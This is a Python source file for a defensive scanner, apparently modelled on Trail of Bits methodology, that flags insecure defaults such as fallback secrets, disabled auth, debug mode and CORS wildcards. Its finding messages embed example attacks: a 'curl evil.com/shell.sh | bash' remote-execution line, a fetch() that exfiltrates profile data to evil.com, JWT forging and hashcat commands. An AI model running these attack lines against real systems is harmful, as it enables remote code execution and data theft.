# security-guard: ignore-file
"""Insecure Defaults Scanner — based on Trail of Bits methodology.

Detects fail-open patterns where the app runs insecurely when configuration
is missing, instead of crashing (fail-secure). Covers:
- Fallback secrets / hardcoded defaults in env var reads
- Authentication disabled by default
- Permissive CORS / debug mode defaults
- Fail-open authorization patterns
"""

import os
import re
import time
from .base import BaseScanner, Category, Finding, ScanResult, Severity, has_ignore_marker

SKIP_DIRS = {
    "node_modules", ".git", "__pycache__", ".venv", "venv", "env",
    "dist", "build", ".next", "vendor", "site-packages", ".pytest_cache",
}
SKIP_FILES_SUFFIX = (".example", ".template", ".sample", ".test", ".spec", ".md")
SKIP_DIRS_NAME = {"test", "tests", "spec", "__tests__", "fixtures", "docs", "examples"}
MAX_FILE_SIZE = 500_000

CODE_EXTS = {".py", ".js", ".ts", ".jsx", ".tsx", ".rb", ".java", ".go", ".php", ".cs", ".env", ".cfg", ".ini", ".yml", ".yaml"}


def _is_test_file(fpath: str) -> bool:
    parts = fpath.replace("\\", "/").lower().split("/")
    if any(p in SKIP_DIRS_NAME for p in parts):
        return True
    base = os.path.basename(fpath).lower()
    return any(base.endswith(s) for s in SKIP_FILES_SUFFIX) or base.startswith("test_") or "fixture" in base


class InsecureDefaultsScanner(BaseScanner):
    """Trail of Bits insecure-defaults methodology:
    Finds fail-open vulnerabilities where missing config lets the app run insecurely."""

    name = "Insecure Defaults (Trail of Bits)"

    def scan(self) -> ScanResult:
        start = time.time()
        result = ScanResult(scanner_name=self.name)
        reported: set[tuple[str, int]] = set()

        for fpath, content, lines in self._iter_files():
            rel = os.path.relpath(fpath, self.target_path)
            result.files_scanned += 1
            if _is_test_file(rel):
                continue

            self._check_fallback_secrets(rel, lines, result, reported)
            self._check_fail_open_auth(rel, lines, result, reported)
            self._check_debug_defaults(rel, lines, result, reported)
            self._check_cors_defaults(rel, lines, result, reported)
            self._check_permissive_access(rel, lines, result, reported)
            self._check_weak_crypto_context(rel, lines, result, reported)
            self._check_hardcoded_admin(rel, lines, result, reported)

        result.scan_time_seconds = time.time() - start
        return result

    # ── File iterator ─────────────────────────────────────────────────────────

    def _iter_files(self):
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in CODE_EXTS:
                    continue
                fpath = os.path.join(root, fname)
                if has_ignore_marker(fpath):
                    continue
                try:
                    if os.path.getsize(fpath) > MAX_FILE_SIZE:
                        continue
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    yield fpath, content, content.split("\n")
                except (OSError, PermissionError):
                    continue

    def _add(self, result, reported, rel, i, title, sev, cat, snippet, desc, rec, root_cause, consequences, cwe="CWE-1188", attack=None):
        key = (rel, i)
        if key in reported:
            return
        reported.add(key)
        result.findings.append(Finding(
            title=title,
            severity=sev,
            category=cat,
            file_path=rel,
            line_number=i,
            code_snippet=snippet[:200],
            description=desc,
            recommendation=rec,
            cwe_id=cwe,
            attack_simulation=attack,
            root_cause=root_cause,
            consequences=consequences,
        ))

    # ── 1. Fallback secrets ────────────────────────────────────────────────────

    # Python: os.environ.get('KEY', 'fallback')  /  os.getenv('KEY', 'fallback')
    _PY_FALLBACK = re.compile(
        r"""os\.(?:environ\.get|getenv)\s*\(\s*['"][A-Z_]{3,}['"]\s*,\s*['"][^'"]{4,}['"]""",
        re.IGNORECASE,
    )
    # JS/TS: process.env.KEY || 'fallback'
    _JS_FALLBACK = re.compile(
        r"""process\.env\.[A-Z_]{3,}\s*\|\|\s*['"][^'"]{4,}['"]""",
        re.IGNORECASE,
    )
    # Ruby: ENV.fetch('KEY', 'fallback')  /  ENV['KEY'] || 'fallback'
    _RB_FALLBACK = re.compile(
        r"""ENV\.fetch\s*\(\s*['"][A-Z_]{3,}['"]\s*,\s*['"][^'"]{4,}['"]""",
        re.IGNORECASE,
    )
    _SECRET_KEYS = re.compile(
        r"""(?:secret|password|passwd|token|api[_-]?key|private[_-]?key|auth|credential|jwt|signing)""",
        re.IGNORECASE,
    )

    def _check_fallback_secrets(self, rel, lines, result, reported):
        for i, line in enumerate(lines, 1):
            for pattern in (self._PY_FALLBACK, self._JS_FALLBACK, self._RB_FALLBACK):
                m = pattern.search(line)
                if not m:
                    continue
                # Only flag if variable name suggests a secret
                if not self._SECRET_KEYS.search(line):
                    continue
                # Skip if it's a fail-secure pattern (crash on missing)
                if re.search(r"""os\.environ\[|ENV\[""", line):
                    continue
                # Check for actual use in security context in surrounding lines
                ctx_start = max(0, i - 10)
                ctx_end = min(len(lines), i + 10)
                context = "\n".join(lines[ctx_start:ctx_end])
                if not re.search(r"""(?:jwt|sign|encrypt|decode|token|auth|session|password|hash|key)""", context, re.IGNORECASE):
                    continue

                self._add(
                    result, reported, rel, i,
                    title="[TOB] Insecure Default: Fail-Open Secret Fallback",
                    sev=Severity.CRITICAL,
                    cat=Category.SECURITY_MISCONFIG,
                    snippet=line.strip(),
                    desc=(
                        "Application reads a secret from an environment variable but provides a "
                        "hardcoded fallback value. If the environment variable is not set in production, "
                        "the app starts successfully but uses a known, weak secret — a 'fail-open' pattern."
                    ),
                    rec=(
                        "Remove the fallback entirely and use a mandatory read that crashes on missing config:\n"
                        "  Python: SECRET = os.environ['SECRET_KEY']  # raises KeyError if missing\n"
                        "  JS: if (!process.env.SECRET) throw new Error('SECRET required')\n"
                        "  Ruby: ENV.fetch('SECRET_KEY')  # raises KeyError if missing\n"
                        "Never provide hardcoded defaults for security-critical values."
                    ),
                    root_cause=(
                        "Developer added a fallback value 'for convenience' during development and "
                        "never removed it before production. The pattern os.environ.get(key, default) "
                        "is inherently fail-open: the app will silently run with the insecure default "
                        "if the environment is not configured correctly."
                    ),
                    consequences=(
                        "IMMEDIATE: Attacker who knows or guesses the fallback value (often found in public repos) "
                        "can forge JWTs, decrypt data, or impersonate any user.\n"
                        "LONG-TERM: All tokens/sessions signed with the weak secret must be invalidated. "
                        "Full incident response required if any data was encrypted with the weak key.\n"
                        "REGULATORY: GDPR Art. 32 / PCI-DSS Req. 6.3 violations for inadequate key management."
                    ),
                    cwe="CWE-1188",
                    attack=(
                        "EXPLOIT: Attacker reads fallback value from public GitHub repo or error message.\n"
                        "JWT FORGE: jwt.encode({'user': 1, 'role': 'admin'}, 'dev-secret-key-123', 'HS256')\n"
                        "RESULT: Full admin access with a valid, server-accepted JWT token."
                    ),
                )
                break

    # ── 2. Fail-open authentication ────────────────────────────────────────────

    _AUTH_DISABLED = re.compile(
        r"""(?:REQUIRE_AUTH|AUTH_ENABLED|AUTHENTICATION|REQUIRE_LOGIN)\s*[=:]\s*"""
        r"""(?:os\.(?:getenv|environ\.get)\s*\(\s*['"][^'"]+['"]\s*,\s*['"]?(?:false|0|no|off|disabled)['"]?\)"""
        r"""|(?:false|False|0|'false'|"false"))""",
        re.IGNORECASE,
    )
    _AUTH_SKIP = re.compile(
        r"""if\s+(?:not\s+)?(?:REQUIRE_AUTH|AUTH_ENABLED|auth_required)\s*(?:==\s*(?:False|0|'false'))?:\s*return""",
        re.IGNORECASE,
    )

    def _check_fail_open_auth(self, rel, lines, result, reported):
        for i, line in enumerate(lines, 1):
            if self._AUTH_DISABLED.search(line) or self._AUTH_SKIP.search(line):
                self._add(
                    result, reported, rel, i,
                    title="[TOB] Insecure Default: Authentication Disabled by Default",
                    sev=Severity.CRITICAL,
                    cat=Category.BROKEN_AUTH,
                    snippet=line.strip(),
                    desc=(
                        "Authentication is configured to be DISABLED by default (fail-open). "
                        "If the environment variable is not explicitly set to enable auth, "
                        "the application will process all requests without authentication."
                    ),
                    rec=(
                        "Invert the default: require explicit opt-OUT of auth, not opt-IN.\n"
                        "  REQUIRE_AUTH = os.getenv('REQUIRE_AUTH', 'true').lower() == 'true'  # default ON\n"
                        "Or better, crash if not explicitly configured:\n"
                        "  REQUIRE_AUTH = os.environ['REQUIRE_AUTH'].lower() == 'true'"
                    ),
                    root_cause=(
                        "Security controls default to 'off' for easier development/testing. "
                        "The pattern 'disable security unless explicitly enabled' means a misconfigured "
                        "production deployment runs without protection."
                    ),
                    consequences=(
                        "IMMEDIATE: Every API endpoint is accessible without credentials.\n"
                        "DATA BREACH: Any user or bot can read/modify all application data.\n"
                        "ZERO EFFORT: No credentials needed — any HTTP client can access protected routes.\n"
                        "DETECTION: Attackers automated scanners find this within minutes of deployment."
                    ),
                    cwe="CWE-306",
                    attack=(
                        "curl http://target/api/admin/users  # No auth header needed\n"
                        "RESULT: Full access to all endpoints without any credentials."
                    ),
                )

    # ── 3. Debug mode enabled by default ──────────────────────────────────────

    _DEBUG_ON = re.compile(
        r"""DEBUG\s*[=:]\s*(?:os\.(?:getenv|environ\.get)\s*\(\s*['"][^'"]+['"]\s*,\s*['"]?(?:true|1|yes|on)['"]?\)|True|true|1)""",
        re.IGNORECASE,
    )
    _FLASK_DEBUG = re.compile(r"""app\.run\s*\([^)]*debug\s*=\s*True""", re.IGNORECASE)
    _DJANGO_DEBUG = re.compile(r"""DEBUG\s*=\s*True(?!\s*if)""")

    def _check_debug_defaults(self, rel, lines, result, reported):
        for i, line in enumerate(lines, 1):
            if not (self._DEBUG_ON.search(line) or self._FLASK_DEBUG.search(line) or self._DJANGO_DEBUG.search(line)):
                continue
            # Skip legitimate env-driven patterns: DEBUG = os.getenv('DEBUG', 'false') == 'true'
            if re.search(r"""getenv.*,.*['"]false['"]|getenv.*,.*['"]0['"]""", line, re.IGNORECASE):
                continue
            # Skip if gated on environment check
            ctx_start = max(0, i - 3)
            ctx_end = min(len(lines), i + 3)
            context = "\n".join(lines[ctx_start:ctx_end])
            if re.search(r"""if.*(?:ENV|NODE_ENV|FLASK_ENV|production|development)|os\.environ\[""", context, re.IGNORECASE):
                continue

            self._add(
                result, reported, rel, i,
                title="[TOB] Insecure Default: Debug Mode Enabled",
                sev=Severity.HIGH,
                cat=Category.SECURITY_MISCONFIG,
                snippet=line.strip(),
                desc=(
                    "Debug mode is hardcoded to True or defaults to enabled. In production, "
                    "this exposes stack traces, an interactive debugger console, detailed error messages, "
                    "and internal application structure to anyone who triggers an error."
                ),
                rec=(
                    "Default DEBUG to False and only enable via explicit env var:\n"
                    "  Python: DEBUG = os.getenv('DEBUG', 'false').lower() == 'true'\n"
                    "  Flask: app.run(debug=os.getenv('FLASK_DEBUG') == '1')\n"
                    "  Django: DEBUG = os.getenv('DJANGO_DEBUG', 'False') == 'True'"
                ),
                root_cause=(
                    "Debug mode left enabled for development convenience. "
                    "The framework's debug features (Werkzeug interactive debugger, Django's debug toolbar) "
                    "are designed for local development only and were never disabled for production."
                ),
                consequences=(
                    "IMMEDIATE: Any unhandled exception shows a full interactive Python console in the browser.\n"
                    "RCE: The Werkzeug debugger PIN can be bypassed or brute-forced → full server shell.\n"
                    "INFO LEAK: Stack traces reveal: file paths, library versions, environment variables, "
                    "database schemas, and other internal details useful for targeted attacks.\n"
                    "COMPLIANCE: Violates PCI-DSS Req. 6.4 (production hardening requirements)."
                ),
                cwe="CWE-94",
                attack=(
                    "1. Send malformed request to trigger 500 error\n"
                    "2. Werkzeug interactive debugger appears in browser (no auth required)\n"
                    "3. Execute: __import__('os').system('curl evil.com/shell.sh | bash')\n"
                    "RESULT: Full Remote Code Execution directly from the browser."
                ),
            )

    # ── 4. CORS wildcard defaults ──────────────────────────────────────────────

    _CORS_STAR = re.compile(
        r"""(?:Access-Control-Allow-Origin.*\*|cors\s*\(\s*\{[^}]*origin\s*:\s*['"]?\*['"]?|CORS_ORIGIN.*[=:]\s*['"]?\*)""",
        re.IGNORECASE,
    )
    _CORS_WITH_CREDS = re.compile(r"""allow.?credentials.*true|credentials.*true""", re.IGNORECASE)

    def _check_cors_defaults(self, rel, lines, result, reported):
        content = "\n".join(lines)
        for i, line in enumerate(lines, 1):
            if not self._CORS_STAR.search(line):
                continue
            # Check if credentials are also allowed (makes it critical)
            ctx = "\n".join(lines[max(0, i-5):min(len(lines), i+10)])
            has_creds = bool(self._CORS_WITH_CREDS.search(ctx))
            sev = Severity.CRITICAL if has_creds else Severity.HIGH
            self._add(
                result, reported, rel, i,
                title="[TOB] Insecure Default: CORS Wildcard Origin" + (" + Credentials" if has_creds else ""),
                sev=sev,
                cat=Category.SECURITY_MISCONFIG,
                snippet=line.strip(),
                desc=(
                    "CORS is configured to allow requests from ANY origin (*). "
                    + ("Combined with Allow-Credentials: true, this allows any website to make credentialed "
                       "requests to this API and read the responses — completely bypassing same-origin protection. "
                       if has_creds else
                       "This allows cross-origin requests from any domain, potentially enabling CSRF-style attacks. ")
                    + "Browsers permit CORS with * only without credentials, but many backends add both insecurely."
                ),
                rec=(
                    "Explicitly allowlist trusted origins:\n"
                    "  Flask-CORS: CORS(app, origins=['https://yourdomain.com'])\n"
                    "  Express: cors({ origin: process.env.ALLOWED_ORIGINS.split(',') })\n"
                    "Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true."
                ),
                root_cause=(
                    "CORS set to '*' for convenience during development so any frontend can call the API. "
                    "The wildcard was never replaced with an explicit allowlist before production. "
                    "Combining with credentials=true is a fundamental CORS misconfiguration."
                ),
                consequences=(
                    "WITH CREDENTIALS=TRUE (CRITICAL): Any malicious website can:\n"
                    "  - Read authenticated API responses (private data, user info)\n"
                    "  - Perform actions as the logged-in user (CSRF equivalent)\n"
                    "  - Exfiltrate session data to attacker's server\n"
                    "WITHOUT CREDENTIALS: Enables reading public API data from any origin, "
                    "potentially leaking business data or enabling large-scale scraping."
                ),
                cwe="CWE-942",
                attack=(
                    "ATTACKER'S PAGE (evil.com):\n"
                    "  fetch('https://target.com/api/user/profile', {credentials: 'include'})\n"
                    "  .then(r => r.json()).then(d => fetch('https://evil.com/steal?d=' + JSON.stringify(d)))\n"
                    "RESULT: Victim's private profile data sent to attacker when victim visits evil.com."
                ),
            )

    # ── 5. Permissive file permissions ─────────────────────────────────────────

    _PERM_777 = re.compile(r"""os\.(?:chmod|makedirs|mkdir)\s*\([^)]*0o?7[0-7][0-7]""")
    _S3_PUBLIC = re.compile(r"""ACL\s*=\s*['"]public-read|createBucket.*public|public.*createBucket""", re.IGNORECASE)

    def _check_permissive_access(self, rel, lines, result, reported):
        for i, line in enumerate(lines, 1):
            if self._PERM_777.search(line):
                self._add(
                    result, reported, rel, i,
                    title="[TOB] Insecure Default: World-Writable File Permissions",
                    sev=Severity.MEDIUM,
                    cat=Category.SECURITY_MISCONFIG,
                    snippet=line.strip(),
                    desc=(
                        "File or directory created with world-writable permissions (0o777/0o666). "
                        "Any user on the system can read, write, or execute this file."
                    ),
                    rec=(
                        "Use restrictive permissions:\n"
                        "  Files: 0o600 (owner read/write) or 0o644 (owner rw, others r)\n"
                        "  Dirs:  0o700 (owner only) or 0o755 (owner rwx, others rx)\n"
                        "Apply principle of least privilege."
                    ),
                    root_cause=(
                        "Permissive permissions applied for compatibility or convenience without "
                        "considering multi-user or containerized environments."
                    ),
                    consequences=(
                        "LOCAL PRIVILEGE ESCALATION: Other users/processes on the system can modify sensitive files.\n"
                        "DATA LEAKAGE: World-readable config files expose secrets to all system users.\n"
                        "SUPPLY CHAIN: Writable scripts can be modified by other processes for persistent access."
                    ),
                    cwe="CWE-732",
                )
            if self._S3_PUBLIC.search(line):
                self._add(
                    result, reported, rel, i,
                    title="[TOB] Insecure Default: Public Cloud Storage Bucket",
                    sev=Severity.HIGH,
                    cat=Category.SECURITY_MISCONFIG,
                    snippet=line.strip(),
                    desc="S3 or cloud storage bucket created with public-read ACL. Any internet user can list and download all files.",
                    rec="Default to private ACL. Only set public for explicitly static assets. Use signed URLs for authenticated access.",
                    root_cause="Bucket created with public ACL for CDN convenience without proper access control design.",
                    consequences=(
                        "PUBLIC EXPOSURE: All files in the bucket are downloadable by anyone.\n"
                        "DATA BREACH: Backups, user uploads, config files, PII — all publicly accessible.\n"
                        "REAL WORLD: Thousands of companies have had S3 data breaches this way (Capital One 2019, etc.)"
                    ),
                    cwe="CWE-284",
                )

    # ── 6. Weak crypto used in security context ────────────────────────────────

    _WEAK_HASH_SECURITY = re.compile(
        r"""(?:hashlib\.(?:md5|sha1)|crypto\.createHash\s*\(\s*['"](?:md5|sha1)['"])\s*\(""",
        re.IGNORECASE,
    )
    _SECURITY_CONTEXT = re.compile(
        r"""(?:password|passwd|token|secret|auth|credential|session|signing)""",
        re.IGNORECASE,
    )

    def _check_weak_crypto_context(self, rel, lines, result, reported):
        for i, line in enumerate(lines, 1):
            if not self._WEAK_HASH_SECURITY.search(line):
                continue
            ctx_start = max(0, i - 5)
            ctx_end = min(len(lines), i + 5)
            context = "\n".join(lines[ctx_start:ctx_end])
            if not self._SECURITY_CONTEXT.search(context):
                continue
            # Skip if it's clearly for cache/non-security use
            if re.search(r"""cache|etag|checksum|cdn|filename""", context, re.IGNORECASE):
                continue
            self._add(
                result, reported, rel, i,
                title="[TOB] Insecure Default: Weak Hash in Security Context",
                sev=Severity.HIGH,
                cat=Category.CRYPTO,
                snippet=line.strip(),
                desc=(
                    "MD5 or SHA1 used in a security-sensitive context (passwords, tokens, auth). "
                    "Both algorithms are cryptographically broken — MD5 since 1996, SHA1 since 2005. "
                    "Rainbow tables for MD5 cover virtually all common passwords."
                ),
                rec=(
                    "Replace with appropriate algorithm for the use case:\n"
                    "  Passwords: bcrypt.hashpw() / argon2 / scrypt (NOT plain hash)\n"
                    "  HMAC/tokens: hashlib.sha256 or sha3_256\n"
                    "  Signatures: Use RS256 or ES256"
                ),
                root_cause=(
                    "MD5/SHA1 were the standard hashing algorithms in the early 2000s and are still "
                    "found in legacy code or tutorials. Developers often use them without knowing they're "
                    "broken for security purposes, or confuse fast hashing (MD5) with password hashing."
                ),
                consequences=(
                    "PASSWORD CRACKING: MD5/SHA1 password hashes can be cracked via rainbow tables in seconds.\n"
                    "TOKEN FORGERY: Weak HMAC signatures can be brute-forced.\n"
                    "COMPLIANCE FAILURE: PCI-DSS, HIPAA, and NIST SP 800-131A prohibit MD5/SHA1 "
                    "for security use cases. May result in audit failures and fines.\n"
                    "REAL WORLD: LinkedIn (2012, 117M MD5 hashes), RockYou (2009, plain MD5) breaches."
                ),
                cwe="CWE-327",
                attack=(
                    "TOOL: hashcat -m 0 hash.txt rockyou.txt  (MD5, 10B guesses/sec on GPU)\n"
                    "TOOL: hashcat -m 100 hash.txt rockyou.txt  (SHA1)\n"
                    "ONLINE: crackstation.net — cracks most common MD5/SHA1 hashes instantly."
                ),
            )

    # ── 7. Hardcoded admin accounts ────────────────────────────────────────────

    _BOOTSTRAP_ADMIN = re.compile(
        r"""(?:bootstrap|create|seed|init).*admin|admin.*(?:bootstrap|create|seed|init)""",
        re.IGNORECASE,
    )
    _HARDCODED_CRED = re.compile(
        r"""(?:password|passwd)\s*[=:]\s*(?:hash_password|hashpw|bcrypt)?\s*\(\s*['"][^'"]{4,}['"]""",
        re.IGNORECASE,
    )

    def _check_hardcoded_admin(self, rel, lines, result, reported):
        in_admin_block = False
        block_start = 0
        for i, line in enumerate(lines, 1):
            if self._BOOTSTRAP_ADMIN.search(line):
                in_admin_block = True
                block_start = i
            if in_admin_block and self._HARDCODED_CRED.search(line):
                # Make sure we haven't exited the function/block
                if i - block_start < 20:
                    # Skip if password comes from env
                    if re.search(r"""os\.environ|os\.getenv|process\.env|ENV\[""", line):
                        in_admin_block = False
                        continue
                    self._add(
                        result, reported, rel, i,
                        title="[TOB] Insecure Default: Hardcoded Admin Account Bootstrap",
                        sev=Severity.CRITICAL,
                        cat=Category.BROKEN_AUTH,
                        snippet=line.strip(),
                        desc=(
                            "Admin account created with a hardcoded default password during application bootstrap. "
                            "Any deployment that doesn't change this password before going live "
                            "has a known admin credential that any attacker can use."
                        ),
                        rec=(
                            "Load admin credentials from environment variables only:\n"
                            "  admin = User(\n"
                            "    username=os.environ['ADMIN_USERNAME'],\n"
                            "    password=hash_password(os.environ['ADMIN_PASSWORD']),\n"
                            "  )\n"
                            "Alternatively, remove auto-bootstrap entirely and require first-run setup."
                        ),
                        root_cause=(
                            "Bootstrap/seeding scripts create an initial admin account for convenience. "
                            "The hardcoded credentials are often left unchanged in production because "
                            "the deployment documentation doesn't require changing them."
                        ),
                        consequences=(
                            "IMMEDIATE: Any attacker who finds the source code can log in as admin.\n"
                            "SCOPE: Full application compromise — admin controls all data and users.\n"
                            "PERSISTENCE: Attacker can create additional admin accounts, install backdoors.\n"
                            "REAL WORLD: Default admin:admin credentials are in every brute-force wordlist."
                        ),
                        cwe="CWE-798",
                        attack=(
                            "STEP 1: Find default credentials in GitHub source code\n"
                            "STEP 2: POST /admin/login with found credentials\n"
                            "RESULT: Full admin access, no exploitation needed."
                        ),
                    )
                    in_admin_block = False
